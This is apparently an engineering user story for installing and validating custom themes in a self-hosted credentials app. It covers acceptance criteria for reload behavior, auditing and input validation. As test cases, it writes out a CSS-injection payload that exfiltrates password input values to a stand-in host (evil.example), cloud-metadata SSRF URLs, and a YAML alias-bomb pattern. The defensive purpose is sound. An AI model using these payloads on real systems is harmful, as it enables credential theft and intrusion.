# Story 16.1: Install and Compile a Custom Theme

## Story

As a self-hosted administrator,
I want to install a custom theme by placing a structured definition file in a designated directory and triggering a reload,
so that I can brand my instance without modifying application code or rebuilding the application.

### Persona journey stub

**Riley-admin (OrgAdmin, self-hosted deployment):**
1. Riley drops a `my-brand.json` file into `/data/themes` (the Docker Compose volume already mounted for persistent state) with color/logo tokens matching their company's brand.
2. Riley calls `POST /api/v1/admin/themes/reload` (via `curl`/httpie, or restarts the container — both trigger a reload pass). No UI action exists yet in this story; 16.2 adds the picker.
3. The response body tells Riley immediately whether `my-brand.json` loaded successfully or failed, and if it failed, exactly why (e.g. `"token \`primaryColor\`: invalid color value"`), not a generic error — Riley can fix the file and retry without guessing.
4. If Riley's file is fine but a colleague's second file (`legacy-theme.yaml`) is malformed, Riley's theme still loads — one bad file never blocks another admin's good one.
5. If Riley typos an asset URL pointing at `http://169.254.169.254/latest/meta-data` (a cloud-metadata SSRF target) thinking it's a clever way to reuse an internal image, the theme fails validation instead of silently shipping a browser-reachable internal reference to every user who selects it.
6. This is an **API-only, admin-tooling story** — there is no end-user-facing (viewer/member) journey change in this story; end users only see a *selectable* theme once Story 16.2 ships the picker UI. Until then, installing/reloading a theme has zero visible effect on any user's screen (correctly so — AC-9's `themes_status` health signal and the audit log are the only observable outputs of this story).

## Acceptance Criteria

> Every AC below includes both a concrete happy-path example and at least one concrete edge/failure-case example, per this story's authoring mandate. All source citations point to `epics.md` §Epic 16 (lines 2696-2739) and `architecture.md`'s Frontend Architecture (Theming) / Process Patterns / Structure Patterns sections unless noted otherwise.

### AC-1: `VAULT_THEMES_DIR` files are picked up on reload

**Given** `VAULT_THEMES_DIR` (env var, default `/data/themes`, inside the persistent Docker Compose volume — never inside the application image, since themes must survive image upgrades — architecture.md line 777),
**when** an admin places a structured JSON or YAML theme definition file there,
**then** it is picked up on the next reload — automatic on container/API startup (architecture.md line 966: "Startup also performs one reload pass automatically"), or via `POST /api/v1/admin/themes/reload` (OrgAdmin only).

- **Happy path example:** Admin places `acme-brand.json`:
  ```json
  {
    "name": "acme-brand",
    "tokens": { "colorPrimary600": "#1e3a8a", "radiusMd": "0.5rem" },
    "assets": { "logo": "https://cdn.acme.example/logo.svg" }
  }
  ```
  into `/data/themes`, then calls `POST /api/v1/admin/themes/reload`. Response: `200 { "loaded": ["acme-brand.json"], "failed": [] }`. A subsequent `GET` of the compiled theme (internal to the web app's theme-application path, Story 16.2's concern) would find `[data-theme="acme-brand"]` with `--color-primary-600: #1e3a8a;` and `--radius-md: 0.5rem;` declared.
- **Edge case — startup auto-reload, no manual trigger:** A fresh container starts with `acme-brand.json` already present in the mounted volume from a previous deployment. Without any admin action, the startup reload pass (identical code path to the manual endpoint, just invoked from `apps/api/src/app.ts`'s `createApp()` after other routes are registered — same "await, don't fire-and-forget" pattern already used for `loadExtension()` at that same call site) makes `acme-brand` available immediately. Verify via an integration test that boots the app with a pre-populated theme fixture directory and asserts the theme is loaded without calling the reload endpoint.
- **Edge case — reload while zero files exist:** Directory exists but is empty. Reload succeeds with `{ "loaded": [], "failed": [] }` — not an error (see AC-2).

### AC-2: missing/absent `VAULT_THEMES_DIR` is zero behavior change, not an error

**Given** `VAULT_THEMES_DIR` is unset or the directory doesn't exist,
**when** the reload runs (automatic at startup, or via the endpoint),
**then** this is not an error — zero custom themes are available, base theme only, identical to the "absent = zero behavior change" pattern already established by `apps/api/src/extensions/loader.ts` for `VAULT_EXTENSIONS_PACKAGE` (architecture.md line 517).

- **Happy path example:** A fresh self-hosted install never sets `VAULT_THEMES_DIR` and never mounts anything at the default `/data/themes` path (or the directory is mounted but empty). Startup reload runs, finds nothing, logs nothing alarming, and the app serves the base theme only. `POST /api/v1/admin/themes/reload` called manually later returns `200 { "loaded": [], "failed": [] }`, not a 4xx/5xx.
- **Edge case — directory exists but is unreadable (permissions error):** `VAULT_THEMES_DIR` points at a real path but the API process lacks read permission (e.g. misconfigured volume mount ownership). This is **not** the same as "absent" — treat it as an operational failure: log an `operationalLog(..., 'fatal', ...)` entry (see Dev Notes "Operational logging") so an admin can diagnose a misconfiguration, but still resolve the reload response successfully with `{ loaded: [], failed: [] }` (never crash the request or block boot) — same fail-safe posture as `loadExtension()` never throwing. Do not conflate "directory absent" (silent, expected, most common) with "directory present but broken" (worth a log line) — write a unit test asserting these two paths produce different log output but the same successful HTTP/reload result shape.

### AC-3: per-file validation — one malformed file never blocks others

**Given** the reload endpoint processes multiple theme files,
**when** one file is malformed — including a file that isn't valid JSON/YAML at all (wrong extension, binary garbage, truncated content), not just valid-syntax-wrong-schema,
**then** validation is per-file — the malformed file fails independently and does not block the other valid files from loading. The response reports `{ loaded: string[], failed: { file: string, reason: string }[] }` with a specific, actionable `reason` (e.g. `"token \`primaryColor\`: invalid color value"`, or `"not valid JSON/YAML"`), never a generic `"validation failed"`.

- **Happy path example:** `VAULT_THEMES_DIR` contains `good-theme.json` (valid) and `broken.yaml` (truncated mid-file, e.g. an unterminated YAML block scalar). Reload returns:
  ```json
  {
    "loaded": ["good-theme.json"],
    "failed": [{ "file": "broken.yaml", "reason": "not valid JSON/YAML" }]
  }
  ```
  `good-theme` is selectable; `broken` is not, and the failure reason is specific enough that the admin doesn't need to open server logs to know what's wrong.
- **Edge case — valid syntax, invalid schema:** `almost-there.json` parses as valid JSON but is missing the required `name` field, or has `tokens: "not-an-object"` (wrong type). This must **also** land in `failed` with a schema-specific reason (e.g. `"missing required field \`name\`"` or `"tokens must be an object"`) — distinguish this from the "not valid JSON/YAML at all" case in the reason text so an admin knows whether to fix syntax or fix content.
- **Edge case — duplicate `name` across two files:** `theme-a.json` and `theme-b.json` both declare `"name": "acme"`. Define and document a deterministic resolution (recommended: first-alphabetically-by-filename wins, the other fails with reason `"duplicate theme name 'acme' (already loaded from theme-a.json)"`) — do not let this be undefined/last-write-wins-by-accident, since that would make reload results non-deterministic across runs on filesystems with non-guaranteed directory-listing order. Write a unit test pinning this exact resolution.
- **Edge case — zero valid files, all fail:** Every file in the directory is malformed. Response is `200 { "loaded": [], "failed": [ ...every file... ] }` — a reload with 100% failures is still a successful HTTP call (the *operation* of reloading succeeded; the *content* was all bad), not a 4xx/5xx. This matters because a naive implementation might be tempted to return an error status when `loaded` is empty — don't.

### AC-4: canonical theme token registry drives per-type CSS-injection-safe compilation

**Given** a canonical theme token registry (`packages/shared/src/constants/theme-tokens.ts` — this file is a **required deliverable of this story**, not an assumed pre-existing artifact; it does not exist yet, confirmed via `ls packages/shared/src/constants/`) defining every valid token key and its type (`color` | `length` | enum-with-declared-values),
**when** a theme file's token values are compiled into `[data-theme="name"]` CSS custom-property declarations,
**then** each value is validated against its token's declared type from the registry: `color` tokens accept only a constrained color grammar (no `url()`, no `;`, no `}`), `length` tokens accept only numeric+unit patterns, enum tokens accept only their declared values — and any token key not present in the registry, or any value that doesn't match its type's grammar, fails validation (same fallback-to-base-theme behavior as a malformed file) rather than being raw-interpolated into CSS.

This is the story's single most security-critical AC (architecture.md line 515: "a real XSS-adjacent surface for a credentials-manager UI" — theme values populate `<input>` fields with sensitive credential values elsewhere in the app, so CSS-selector-based exfiltration of form input values is a real, not theoretical, technique here).

- **Happy path example:** Registry declares `colorPrimary600: { type: 'color' }`, `radiusMd: { type: 'length' }`, `fontWeightBody: { type: 'enum', values: ['normal', 'medium', 'bold'] }`. A theme file supplies `{ "colorPrimary600": "#1e3a8a", "radiusMd": "0.5rem", "fontWeightBody": "medium" }`. All three compile cleanly into `--color-primary-600: #1e3a8a; --radius-md: 0.5rem; --font-weight-body: medium;` inside a `[data-theme="acme-brand"] { ... }` block.
- **Attack/edge case — CSS injection via a `color` token (the exact scenario architecture.md flags):** A theme file supplies `{ "colorPrimary600": "red; } input[type=password][value^=\"a\"] { background: url(https://evil.example/exfil?a)" }`. The color grammar (hex `#[0-9a-f]{3,8}`, or a tightly-bounded `rgb()`/`hsl()` function form with no nested `url()`/`;`/`}`) rejects this value outright — the theme fails validation (per AC-6, falls back to base theme), and the raw string is **never** string-concatenated into the compiled CSS. Write a test asserting this exact payload (or an equivalent breakout attempt) is rejected, not merely "some CSS injection is rejected" — the test must exercise the specific `;`/`}`/`url(` breakout characters named in architecture.md.
- **Edge case — unregistered token key:** Theme file supplies `{ "colorPrimary600": "#1e3a8a", "someRandomKey": "anything" }`. `someRandomKey` is not in the registry — the **entire file** fails validation (same fallback-to-base-theme behavior as AC-6; do not silently drop just the one bad key and load the rest of that same file's valid keys — the AC's "fails validation" language applies at the file/theme level, consistent with the malformed-file failure mode in AC-3, not a per-key partial-load model). Confirm this interpretation is intentional in code review since the spec text is compatible with either reading — the story's own default is "whole-file rejection on unregistered key" for consistency with the other whole-file rejection paths (schema-invalid, syntax-invalid).
- **Edge case — `length` token with a unit not in the allowed set:** `{ "radiusMd": "0.5vw-hack" }` or `{ "radiusMd": "calc(1px + 1px)" }` — the length grammar must be a strict numeric+unit pattern (e.g. `^-?\d+(\.\d+)?(px|rem|em|%)$`), rejecting `calc()`, custom units, or anything with embedded expressions. `calc()` in particular is worth an explicit test since it's syntactically "numeric-ish" but is itself an expression-evaluation surface.
- **Edge case — enum token with an undeclared value:** `{ "fontWeightBody": "ultrablack" }` when the registry only declares `['normal', 'medium', 'bold']`. Rejected — enum tokens are a closed set, never free text.

### AC-5: theme asset URLs validated against the existing webhook SSRF blocklist

**Given** a theme's asset references (fonts, images, logo),
**when** validated at install/reload time,
**then** each URL is checked against the same SSRF blocklist already established for webhook URLs (RFC 1918 / localhost / link-local / cloud metadata endpoints — reuse `apps/api/src/lib/safe-fetch.ts`'s `resolveAndValidatePublicAddresses()` / `isPrivateOrReservedAddress()`, do not reimplement) — a theme is admin-installed but still effectively untrusted input. Assets are fetched directly by the browser, not proxied server-side, so this is a one-time check at install/reload, not a per-request re-validation (architecture.md line 514 — there is no server-side fetch step to rebind against for a DNS-rebinding TOCTOU concern here, unlike webhooks; the blocklist check exists purely to keep an internal-only URL out of a theme block browsers will fetch directly).

- **Happy path example:** Theme file's `assets.logo` is `https://cdn.acme.example/logo.svg`, a public HTTPS URL resolving to a public IP. Validation passes; the literal URL string is passed through unchanged into the compiled `[data-theme]` block for the browser to fetch directly.
- **Edge case — RFC 1918 private address:** `assets.logo` is `http://192.168.1.50/logo.png`. Resolves (or is already a literal IP) to a private range — rejected, theme fails validation with a reason like `"asset 'logo': URL resolves to a private/reserved address"`.
- **Edge case — cloud metadata endpoint:** `assets.favicon` is `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Rejected by the same link-local range check `safe-fetch.ts` already applies to webhooks — reuse, don't duplicate the CIDR list.
- **Edge case — DNS name resolving to a private address:** `assets.logo` is `https://internal.corp.example/logo.png`, and that hostname resolves (in the admin's DNS context) to `10.0.0.5`. Reuse `resolveAndValidatePublicAddresses()`'s actual DNS-lookup-then-check behavior (not a hostname-string-pattern check) so this is caught the same way webhook URL validation already catches it.
- **Edge case — non-HTTPS asset URL:** `assets.logo` is `http://plain-http.example/logo.png` (no TLS). Decide and document explicitly whether theme assets must be HTTPS-only like `safeFetchExternal()` requires for webhooks (Dev Notes judgment call — recommended: yes, require HTTPS, for defense-in-depth consistency with the rest of this codebase's outbound-URL conventions, even though the server never fetches it) — write a test pinning whichever decision is made so it isn't accidentally reversed later.

### AC-6: any validation failure falls back to base theme, never a broken/unsafe UI

**Given** a theme fails validation for any reason (malformed structure, invalid token grammar, blocklisted asset URL),
**when** the reload processes it,
**then** the system falls back to the base theme for anyone with that theme selected, rather than rendering a broken or unsafe UI.

- **Happy path example:** A previously-working theme `acme-brand` is selected by 40 users. An admin edits the file on disk, accidentally introducing a CSS-injection-shaped value, and reloads. The reload response reports `acme-brand` in `failed`. All 40 users' next page load renders the base theme instead of a broken/unsafe custom theme — no user sees a half-applied or hostile stylesheet.
- **Edge case — theme fails on the very first install (never previously loaded):** No user has this theme selected yet (it's brand new), so "falls back to base theme" is a no-op in terms of user impact, but the reload response must still report it under `failed` with a specific reason — the same code path applies whether or not any user currently has the theme selected. This scenario is distinct from AC-9's "orphaned theme" (which is about a theme being *removed*, not *failing validation*) — don't conflate the two in implementation; both end in "base theme," but one is a validation-failure path (this AC) and the other is a file-removal path (AC-9, tracked as follow-up UX in Story 16.2's "one-time dismissible notice," out of scope for this story's API-only surface — see Dev Notes).

### AC-7: successful reload writes `AuditEvent.THEME_RELOADED`

**And** a successful reload writes an `AuditEvent.THEME_RELOADED` entry.

- **Happy path example:** Admin (org role `admin` or `owner`, MFA-enrolled) calls `POST /api/v1/admin/themes/reload`. Reload processes 2 files, 1 loads, 1 fails. This still counts as "a successful reload" (the *endpoint call* succeeded, even though not every *file* did) — write `AuditEvent.THEME_RELOADED` with a payload summarizing `{ loadedCount: 1, failedCount: 1, failedFiles: ['broken.yaml'] }` (sanitized — see Dev Notes "audit payload sanitization"; never include raw file *contents* in the audit payload, only filenames and counts, since a hostile theme file's contents are exactly the kind of untrusted value `sanitizeAuditPayload()`/`FORBIDDEN_AUDIT_KEYS` exists to keep out of the audit trail). Audit event is written **per org** (see Dev Notes "audit fanout" — reload has no request-scoped single org, same shape as `loadExtension()`'s boot-time fanout, OR is scoped to the requesting admin's own org if invoked via the authenticated endpoint rather than at boot — see Dev Notes judgment call).
- **Edge case — startup auto-reload (no authenticated admin actor):** At container boot, the automatic reload pass has no HTTP request, no `authContext`, no single org (same situation `loadExtension()` already solves via `runAuditFanout()` writing one `AuditEvent.EXTENSION_LOADED`/`EXTENSION_LOAD_FAILED` row per existing org, via `fetchAllOrgIds()`). Reuse or closely mirror that exact fanout pattern for the startup theme-reload audit write — do not skip auditing the startup pass just because there's no authenticated caller; per-org fanout with per-org write-failure isolation (log-and-continue, never crash boot) is the established precedent (`apps/api/src/extensions/loader.ts`'s `runAuditFanout()`).
- **Edge case — audit write itself fails:** Following this codebase's fail-closed convention for authenticated-endpoint audit writes (`secure-route.ts`'s `AuditWriteError` → 503 `audit_write_failed`), an admin-triggered `POST /api/v1/admin/themes/reload` call whose audit write fails must roll back and return 503, **not** silently succeed with an unaudited reload — reuse `secureRoute()`'s built-in `writeAuditEvent` mechanism (see Dev Notes "endpoint wiring") rather than hand-rolling audit writes, so this fail-closed behavior comes for free. The startup automatic pass is the one exception (per the point above): boot-time fanout write failures are logged and do not block boot, matching the extension loader's own precedent, since there is no HTTP caller to return a 503 to at boot time.

### AC-8 (Product Surface Contract / self-containment requirement — not an epics.md-sourced AC, added for this story's completeness): `THEME_RELOADED` registered in the shared audit-event constants

**Given** `packages/shared/src/constants/audit-events.ts`'s `AuditEvent` object (confirmed via direct read: it does **not** yet contain `THEME_RELOADED` — the last Phase-2-related additions are `EXTERNAL_IDENTITY_LINKED`/`SSO_LOGIN_SUCCEEDED`/`SSO_LOGIN_REJECTED` from Story 14.3),
**when** this story ships,
**then** add `THEME_RELOADED: 'theme.reloaded'` to that object, following the established lowercase-dot-notation convention for all Phase 2 additions (architecture.md line 720 already documents this exact string as the intended value — `'theme.reloaded'` — so this is not a new naming decision, just wiring the already-agreed string into the actual registry file). No database migration is required: `audit_log_entries.event_type` is a plain `text` column with no CHECK constraint or enum type (confirmed via `packages/db/src/schema/audit-log-entries.ts`), so a new string value needs no schema change.

- **Happy path example:** After adding the constant, `AuditEvent.THEME_RELOADED` resolves to `'theme.reloaded'` and is importable from `@project-vault/shared` exactly like every other `AuditEvent.*` value used elsewhere in `apps/api`.
- **Edge case — `audit-events.test.ts` exhaustiveness check:** `packages/shared/src/constants/audit-events.test.ts` likely asserts something about the full set of `AuditEvent` values (e.g. no duplicate string values, or a fixed count) — read that test file before adding the constant and update/extend it if it hardcodes a value count or an exhaustive literal-union list, so the new entry doesn't silently break an unrelated existing test.

### AC-10: theme file parsing is protected against resource-exhaustion attacks (added via adversarial elicitation — not in epics.md, but a direct consequence of "themes are admin-installed but still effectively untrusted input," the same framing epics.md/architecture.md already use to justify AC-4/AC-5)

**Given** theme files are parsed as JSON/YAML and then compiled,
**when** a file is maliciously or accidentally constructed to consume excessive CPU/memory during parsing,
**then** the reload process must bound both the size of any single file it will attempt to parse and the parser's susceptibility to algorithmic-complexity attacks, so that one hostile/broken file cannot degrade or crash the API process for every org on the instance (a much larger blast radius than AC-3's "one bad file" framing, which only covers *validation* failures, not *parser-level* resource exhaustion during the parse step itself).

This AC exists because AC-3/AC-4/AC-5 all assume the file parses (successfully or not) in bounded time/memory — none of them address the parse step itself being the attack surface. Two concrete, well-known vectors apply directly to this story's tech choices:

- **Happy path example:** A normal theme file (`acme-brand.json`, ~2KB) parses and compiles in well under a millisecond, no limits triggered.
- **Attack/edge case — YAML "billion laughs" / alias-expansion DoS:** A `.yaml` file defines a small number of YAML anchors that reference each other in a nested/repeated pattern (`&a ["x","x","x",...]`, `&b [*a,*a,*a,...]`, `&c [*b,*b,*b,...]`, etc.), which the `yaml` npm package (like most YAML parsers) will by default expand into memory as a fully-realized data structure — a few hundred bytes on disk can expand to gigabytes in memory. **Mitigation:** call `YAML.parse()` with `{ maxAliasCount: <small number, e.g. 100> }` (a real option supported by the `yaml` v2 package specifically to cap alias-expansion count) rather than the unbounded default, and treat a `maxAliasCount` overflow as a per-file validation failure (`reason: "YAML alias expansion exceeds safe limit"`) — not a crash, not an unbounded parse. Write a test that constructs a small alias-bomb fixture and asserts it fails fast with this reason rather than hanging or spiking memory.
- **Attack/edge case — oversized file:** A theme file (JSON or YAML) is many megabytes (or gigabytes) in size — either a deliberate DoS attempt or an admin accidentally pointing `VAULT_THEMES_DIR` at a directory containing unrelated large files with a `.json`/`.yaml` extension. **Mitigation:** check file size via `fs.stat()` *before* reading file contents into memory, and skip reading/parsing entirely for any file over a fixed cap (recommend 256 KB — generous for a token/color/asset-URL definition file, which realistically needs a few KB) — record it in `failed` with `reason: "file exceeds maximum size (256KB)"`. Never `fs.readFile()` an unbounded file into memory first and check size after.
- **Edge case — directory listing includes non-theme files:** `VAULT_THEMES_DIR` contains `README.md`, `.DS_Store`, or a stray `backup.sql.gz` alongside real theme files (a likely real-world occurrence, not a deliberate attack, since admins manage this directory by hand per the persona journey). **Behavior:** filter the directory listing to `.json`/`.yaml`/`.yml` extensions *before* any size check or parse attempt — non-matching files are silently skipped (not reported in `failed`, since they were never theme-file *attempts*, avoiding alarming an admin about files that were never meant to be themes). Write a test asserting a mixed directory (2 valid themes + a `README.md`) reports exactly `{ loaded: [the 2 themes], failed: [] }`, not `failed: [{"file": "README.md", ...}]`.

### AC-9: `GET /health`-visible reload/theme status signal (Dev Notes-recommended addition for consistency with 14.2's pattern — see rationale below)

**Given** Story 14.2 established the precedent that a Phase-2 loader's status is surfaced on the existing public `GET /health` endpoint (`extensions_status: 'not_configured' | 'loaded' | 'load_failed'`) a full story *before* any admin UI consumed it (14.5, three stories later),
**when** this story ships the equivalent theming reload/compile capability,
**then** add an analogous field summarizing theme-loading health — e.g. `themesLoaded: number` and `themesFailed: number` (simple counts, not full file lists, to keep `/health` lightweight and avoid leaking filenames on an unauthenticated public endpoint) — to `GET /health`'s response.

This AC is a judgment call, not a literal epics.md requirement — flagged explicitly as such so a reviewer can confirm or reject it. It exists because (a) it gives this story *some* observable signal beyond the admin-only reload endpoint and the audit log, consistent with this story's Product Surface Contract commitment to not be a totally invisible change, and (b) it mirrors an already-shipped, already-reviewed precedent (14.2) rather than inventing a new pattern.

- **Happy path example:** After a successful reload with 2 loaded / 1 failed, `GET /health` (no auth required) includes `"themesLoaded": 2, "themesFailed": 1` alongside its existing fields.
- **Edge case — never reloaded yet (fresh boot before the automatic startup pass completes, if `/health` can somehow be hit mid-boot):** Return `"themesLoaded": 0, "themesFailed": 0` — the same default/absent-directory shape as AC-2, not `null`/`undefined`, so `/health` consumers never have to special-case a missing field.
- **Edge case — do not leak filenames or failure reasons on `/health`:** Unlike the authenticated `POST /admin/themes/reload` response (AC-3), `/health` is public and unauthenticated — only expose counts, never the `failed[].file`/`failed[].reason` detail, to avoid handing an unauthenticated caller a map of what's misconfigured on the instance. Write a test asserting `/health`'s theme fields never contain a `reason` or `file` key.

## Out of Scope (explicit — do not scope-creep)

- **Theme selection UI or API** (choosing which theme is active for a user) — that is Story 16.2 in full. This story only installs/compiles/validates; it does not add any "active theme" concept, user preference column, or `[data-theme]` attribute application in the browser.
- **`(app)/admin/themes` admin page** — no UI ships in this story (see Product Surface Contract). Architecture.md's file-structure tree lists `themes/` under `(app)/admin/` as "reload trigger + active theme selection" (line 1304), but that's the eventual home for *both* 16.1's reload trigger UI *and* 16.2's selection UI combined — building it now with only half its function (a reload button and nothing to select) is premature; defer the whole page to 16.2.
- **`apps/web/src/lib/theme/apply-theme.ts`** (architecture.md line 1322-1323, "reads compiled `[data-theme]` CSS custom-property blocks") — this is the *consumer* of what this story compiles; it belongs with 16.2's runtime theme-switching work, not this story's install/compile/validate scope.

## Dev Notes

- **This is the first story in Epic 16** — no previous-story intelligence to inherit within this epic. The closest structural precedent is Story 14.2 (`apps/api/src/extensions/loader.ts`), which this story's reload/fanout/health-signal design deliberately mirrors wherever the shapes are compatible (both are "load a founder/admin-configured thing from disk/config, fail-safe, audit the outcome, surface a coarse status on `/health`"). Read `apps/api/src/extensions/loader.ts` in full before starting — its `runAuditFanout()`, `isDoubleInvocation()`-style idempotency guard (N/A here since reload is meant to be re-triggerable, unlike one-time extension load, but the *fanout* logic is directly reusable), and "never throws, resolves to state" philosophy are the right shape to imitate, not reinvent.
- **Security posture — this is explicitly flagged in epics.md as "Security-critical, not optional hardening"** (epics.md line 2702): AC-4 (token grammar) and AC-5 (SSRF blocklist) were both added *after* a 5-agent adversarial review found the original design unaddressed on both points (architecture.md's changelog, line 9/14). Treat AC-4 and AC-5 as the highest-priority, most-tested parts of this story — do not under-invest in their test coverage relative to the "happier path" ACs.
- **YAML parsing dependency:** No YAML parser exists yet in `apps/api`'s dependencies (confirmed via `apps/api/package.json` read — only `zod` for schema validation). The `yaml` npm package (`^2.9.0`) is already a dependency elsewhere in this monorepo (`packages/vault-action/package.json`) — add the same version to `apps/api/package.json` rather than introducing a second YAML library (e.g. `js-yaml`) or a different version. Confirm `yaml`'s parser is used in **safe mode** (it is, by default — `yaml` v2's `parse()` does not support arbitrary code execution like some legacy YAML parsers' `!!python/object` tags; still, do not enable any "unsafe" schema/tag options).
- **Reuse, don't reimplement, the SSRF blocklist.** `apps/api/src/lib/safe-fetch.ts` exports `resolveAndValidatePublicAddresses()`, `isPrivateOrReservedAddress()`, `isPrivateIPv4()`, `isPrivateIPv6()` — all already unit-tested (`safe-fetch.test.ts`) and already handle the IPv4-mapped-IPv6, DNS-rebinding-adjacent, and CIDR-parsing edge cases correctly. Theme asset URL validation in this story is a **pure validation call** (no actual fetch — architecture.md line 514 is explicit that the server never fetches theme assets), so use `resolveAndValidatePublicAddresses()` for its DNS-resolve-and-check behavior without needing `safeFetchExternal()`'s full fetch/pinning/timeout machinery (that machinery exists for the *fetch* step, which doesn't happen here).
- **Endpoint wiring — follow `admin/routes.ts`'s `POST /notifications/test` almost exactly.** That existing route is the closest precedent in this codebase for "OrgAdmin-only, MFA-required, rate-limited, audit-optional-by-default-but-here-explicit POST action with no request body and a summary JSON response." Its `security: { allowedRoles: ['owner', 'admin'], requireMfa: true, rateLimit: { max: 10, key: '...' }, writeAuditEvent: false }` shape is the template — except this story sets `writeAuditEvent` to an explicit `AuditConfig` (not `false`) since AC-7 requires an audit row on success. Review `secure-route.ts`'s `auditConfigFor()` and `defaultAuditWriter()` (lines 192-269) to understand exactly how `writeAuditEvent`'s payload callback and `resourceIdFromParams` work before wiring this — there is no natural single `resourceId` for a reload (it processes many files), so leave `resourceType`/`resourceIdFromParams` unset and put the summary (counts + failed filenames) in `payload` only.
- **Fail-closed audit semantics for the authenticated endpoint, fail-open (log-and-continue) for the startup pass — these are deliberately different,** and this asymmetry is intentional, not an inconsistency: an admin who explicitly triggers a reload expects a definitive answer (503 if the audit write itself fails, per `secure-route.ts`'s existing `AuditWriteError` → 503 convention used by every other `secureRoute()`-registered mutating endpoint in this codebase); a fresh container booting has no HTTP caller to report a 503 to, so `loadExtension()`'s precedent of "log the per-org audit-write failure and keep booting" is correct there instead. Do not accidentally make the startup pass fail-closed (it must never block boot) or the authenticated endpoint fail-open (it must not silently claim success while failing to audit a security-relevant admin action).
- **Operational logging convention:** Use `apps/api/src/lib/logger.js`'s `operationalLog()` helper (already used by `loader.ts` and elsewhere) with an `OperationalEvent` constant — add a new entry to `packages/shared/src/constants/operational-event-types.ts` for the "themes directory present but unreadable" case (AC-2's edge case) if no existing generic entry fits; check that file's existing entries first (e.g. `EXTENSION_AUDIT_FANOUT_ROW_FAILED`) for a naming-convention match (`THEME_*` prefix, consistent with `EXTENSION_*`).
- **Audit payload sanitization is automatic if you use `secureRoute()`'s `writeAuditEvent`/`defaultAuditWriter` path** — `sanitizeAuditPayload()`/`FORBIDDEN_AUDIT_KEYS` (in `secure-route.ts`) strip forbidden keys (`password`, `secret`, `value`, etc.) from any payload automatically. Still, deliberately keep the payload to `{ loadedCount, failedCount, failedFiles: string[] }` (filenames only) — never pass raw theme file *contents* into the audit payload even though the sanitizer would catch some obviously-named forbidden keys, since a hostile theme file's arbitrary JSON/YAML keys won't reliably match the fixed forbidden-key list.
- **Flat module, not nested under `admin/`.** architecture.md's file tree (line 1194) is explicit: `theming/` is a sibling of `backup/` and `admin/` under `modules/`, following the same "flat module" convention `backup/` already established (architecture.md line 1657: "`modules/theming/` follows the existing flat-module convention set by `modules/backup/`"). Do not create `modules/admin/theming/`.
- **`route-audit.test.ts` will fail your PR if the new route isn't registered with a `SecureRoute` marker** (architecture.md line 1237 describes this exact CI guard) — this is enforced automatically by using `secureRoute()` for registration (which populates the exported `secureRoutes: Set<string>` in `secure-route.ts`), not something you need to touch manually, but be aware it exists so an unexpected failure there points you back to "did I use `secureRoute()` correctly."
- **No database migration needed.** Confirmed: `packages/db/src/schema/audit-log-entries.ts`'s `eventType` column is plain `text`, not an enum/CHECK-constrained type, so adding `THEME_RELOADED` requires no `packages/db/src/migrations/00XX_*.sql` file. The latest migration in the repo is `0057_organizations_default_locale.sql` (from Story 15.2) — confirms no schema changes are pending that this story would need to sequence after.
- **RLS/tenant isolation:** This story is **not** tenant-scoped in the way most other modules are — theme files live on the shared filesystem (`VAULT_THEMES_DIR`), not per-org, and are available to *every* org on the instance (self-hosted deployments in this product are typically single-tenant-per-install, per the existing "org" model's usage elsewhere; a hosted-SaaS multi-org install would see the same installed themes available to all its orgs — there is no per-org theme namespace in this epic's scope). The only per-org-scoped operation in this story is the audit write (each `THEME_RELOADED` row is written into a specific org's audit log, scoped via `withOrg()`/RLS same as every other audit write) — the theme *files themselves* are instance-global, not org-scoped. Do not add an `orgId` column or RLS policy to anything theme-related in this story; that would contradict the epics.md/architecture.md design (a single shared theme directory), and 16.2 (per-user theme *selection*) is also user-scoped, not introducing org-scoped theme storage either.
- **TOCTOU on the AC-10 size check (found via pre-mortem elicitation):** `fs.stat()`-then-`fs.readFile()` has a window where the file can grow between the two calls (e.g. a concurrent process still writing the file, or a symlink target swapped mid-check). Do not treat the `stat()` size as an absolute guarantee — use a streaming read with a hard byte cap (or Node's `fs.readFile()` with a size-aware early-abort wrapper) so the *actual* bytes read are bounded regardless of what `stat()` reported, not just a pre-check gate. A test asserting "file grows after stat but read is still capped" is a reasonable but optional addition; at minimum, do not rely on `stat()` alone as the only enforcement point.
- **Symlinks in `VAULT_THEMES_DIR` (found via pre-mortem elicitation):** `fs.readdir()`/`fs.readFile()` follow symlinks by default. Since this directory is admin-controlled (the admin who can write to the mounted volume is already a trusted OrgAdmin, same trust level as the person who could otherwise edit the container's env vars), a symlink pointing outside the volume is a self-inflicted risk, not a new privilege escalation — explicitly **not** treated as a vulnerability to block on. Document this as an accepted-risk decision in code review rather than silently ignoring it: no special symlink-resolution restriction is required for this story, but do not accidentally introduce one that breaks legitimate symlinked config (e.g. some deployments symlink `/data/themes` itself from a different mount).
- **Concurrent access:** Two admins could call `POST /admin/themes/reload` simultaneously (or the startup pass could race a manual call in a multi-replica deployment). The reload operation is read-then-compile-then-hold-in-memory (or however Task 2's service caches compiled output) with no persistent write beyond the audit log — there is no theme-file *write* path in this story (files are placed by the admin directly on the filesystem, not via an upload API), so the concurrency surface is narrow: two simultaneous reloads racing to update in-memory compiled-theme state. Use a simple last-write-wins for the in-memory cache (whichever reload's `Promise` resolves last wins) — do not build distributed locking for this; it mirrors `loadExtension()`'s own `isDoubleInvocation()` guard in spirit (accept that concurrent triggers are rare and low-stakes) but reload, unlike one-time extension load, is expected to be re-triggerable, so do not port the exact "ignore a second call" guard — just don't crash or corrupt state under a race. Add a test that fires two concurrent reload calls and asserts the process completes without throwing and ends in a consistent (not partially-mixed) state.
- **Rate limits:** See Task 4.1 — `{ max: 10, key: 'POST /admin/themes/reload' }`, matching the `admin/notifications/test` precedent exactly (same file-doing-real-work-per-call justification).
- **Migration compatibility:** N/A for this story specifically (no schema change), but note for future stories in this epic: 16.2 (theme *selection*) will need a per-user preference column/table, which is where migration compatibility concerns will first arise in this epic — not here.
- **Operational logging:** Covered above (AC-2 edge case, "themes directory present but unreadable"). Also log (at `info`/`debug` level, not `fatal`) a summary line on every reload — `{loadedCount} themes loaded, {failedCount} failed` — for operators tailing structured logs, independent of the audit trail (audit is for security/compliance review; operational logs are for live debugging).
